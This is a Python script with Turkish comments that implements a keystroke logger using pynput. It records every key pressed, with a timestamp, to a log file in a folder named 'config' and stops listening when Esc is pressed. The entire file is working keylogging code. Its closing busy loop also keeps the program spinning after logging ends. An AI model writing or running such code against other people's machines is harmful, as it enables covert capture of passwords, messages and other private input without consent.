import os
from pynput import keyboard
from datetime import datetime

# Config klasörünün yolu
config_folder = "config"

# Logger dosyasının yolu
logger_file = os.path.join(config_folder, "logger.txt")

# Config klasörünü oluştur
os.makedirs(config_folder, exist_ok=True)

# Logger dosyasını oluştur ve aç
with open(logger_file, "a") as file:
    file.write("------ Başlangıç Tarih ve Saat: {} ------\n".format(datetime.now()))

# Tuş basılınca çalışacak fonksiyon
def on_press(key):
    # Logger dosyasına basılan tuşu ve tarih/saati kaydet
    with open(logger_file, "a") as file:
        file.write("[{}] Tus basildi: {}\n".format(datetime.now(), key))

# Tuş bırakılınca çalışacak fonksiyon
def on_release(key):
    if key == keyboard.Key.esc:
        # ESC tuşuna basıldığında kaydı durdur
        return False

# Tuş dinleyicisini oluştur
listener = keyboard.Listener(on_press=on_press, on_release=on_release)

# Dinleme işlemini başlat
listener.start()

# Programı sonlandırana kadar dinleme işlemine devam et
while True:
    pass
